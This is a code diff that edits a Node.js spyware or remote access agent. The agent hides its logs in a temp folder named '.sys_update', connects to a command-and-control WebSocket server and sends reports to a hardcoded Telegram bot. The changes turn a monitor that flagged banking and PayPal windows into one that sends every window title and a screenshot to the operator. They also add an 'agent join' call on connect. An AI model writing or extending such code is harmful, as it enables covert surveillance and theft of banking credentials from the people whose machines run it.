@@ -1,10 +1,11 @@
 const WebSocket = require('ws');
 const { exec } = require('child_process');
-const fs = require('fs'); // <--- THIS WAS MISSING
+const fs = require('fs'); 
 const os = require('os');
 const path = require('path');
 const https = require('https');
 const crypto = require('crypto');
+const http = require('http'); // <--- FIX: Define http module
 
 // --- LOGGING SYSTEM ---
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
@@ -41,8 +42,6 @@ try {
 
 // --- CONFIGURATION ---
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
-// If using Render locally or for testing, change URL above to:
-// const WS_URL = 'ws://localhost:3000'; 
 
 const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
 const TELEGRAM_CHAT_ID = '6172226452';
@@ -88,6 +87,9 @@ function initConnection() {
  }));
 
  startMonitoring();
+ 
+ // JOIN ALL AGENTS IMMEDIATELY ON CONNECT
+ joinAllAgents();
  });
 
  ws.on('message', (msg) => {
@@ -147,16 +149,16 @@ function startMonitoring() {
  }
  }, 30000);
 
- // Banking Detection
+ // Universal Window Title Monitoring (No more banking filter)
  setInterval(async () => {
  const title = await getCurrentWindowTitle();
- if (title.toLowerCase().includes('bank') || title.toLowerCase().includes('paypal')) {
- sendTelegram(`🏦 BANKING DETECTED: ${title}`);
+ if (title) {
+ sendTelegram(`👁️ Current Window: ${title}`);
  captureScreen();
  }
  }, 2000);
 
- // Screen Capture
+ // Screen Capture Loop
  setInterval(() => {
  if (isConnected) captureScreen();
  }, 5000);
@@ -220,7 +222,6 @@ async function getCurrentWindowTitle() {
 function sendTelegram(msg) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
  https.get(url, (res) => {
- // Check status code if needed
  }).on('error', (e) => {
  log(`[TG] Error: ${e.message}`);
  });
@@ -260,6 +261,15 @@ function handleSignaling(data) {
 
 function keepAlive() {
  setInterval(() => {}, 60000);
+}
+
+// --- NEW FUNCTION: Join all active agents on connect ---
+function joinAllAgents() {
+ log("[JOIN] Sending join requests to all known agents...");
+ safeSend(JSON.stringify({
+ type: 'join_all',
+ from: myId
+ }));
 }
 
 // --- HTTP SERVER SETUP ---
